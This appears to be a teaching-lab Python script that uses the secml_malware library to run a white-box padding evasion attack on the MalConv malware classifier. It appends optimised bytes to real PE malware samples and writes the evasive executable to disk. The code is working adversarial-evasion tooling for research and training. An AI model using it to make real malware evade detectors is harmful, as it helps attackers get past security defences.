import os
import magic
from secml.array import CArray

from secml_malware.models.malconv import MalConv
from secml_malware.models.c_classifier_end2end_malware import CClassifierEnd2EndMalware, End2EndModel

from secml_malware.attack.whitebox import CPaddingEvasion

# +------------------------------------------------------------------------------------------------+
# | Lab03a - Padding Attack                                                                        |
# | Edit the three values below to edit the extent to which the padding attack is applied to the   |
# | provided executable files. After the attack is applied and an adversarial sample generated,    |
# | the estimated effectiveness of that sample will be calculated and provided in the terminal.    |
# +------------------------------------------------------------------------------------------------+
BYTES_TO_APPEND = 512       # Number of bytes appended to file at the end of each round
APPEND_ROUNDS   = 3         # The number of rounds to execute the append operation
THRESHOLD       = 0.90      # Allowable detection threshold (lower is more strict)
# ==================================================================================================

SAMPLE_FOLDER = "secml_malware/data/malware_samples/test_folder"

net = MalConv()
net = CClassifierEnd2EndMalware(net)
net.load_pretrained_model()
fgsm = CPaddingEvasion(net, how_many = BYTES_TO_APPEND, iterations = APPEND_ROUNDS, random_init = True, threshold = THRESHOLD)

X = []
y = []
file_names = []
for i, f in enumerate(os.listdir(SAMPLE_FOLDER)):
    path = os.path.join(SAMPLE_FOLDER, f)
    if "PE32" not in magic.from_file(path):
        continue
    with open(path, "rb") as file_handle:
        code = file_handle.read()
    x = End2EndModel.bytes_to_numpy(
        code, net.get_input_max_length(), 256, False
    )
    _, confidence = net.predict(CArray(x), True)

    X.append(x)
    conf = confidence[1][0].item()
    y.append([1 - conf, conf])
    file_names.append(path)

y_pred, adv_score, adv_ds, f_obj = fgsm.run(X[0], y[0][1])
real_adv_x = fgsm.create_real_sample_from_adv (file_names[0], adv_ds.X[0, :], "PaddingSample.exe")

# Print out results of attack
print ("Adversarial sample generated!")
print ("Projected Effectiveness: {eff}".format (eff = (1 - f_obj)))

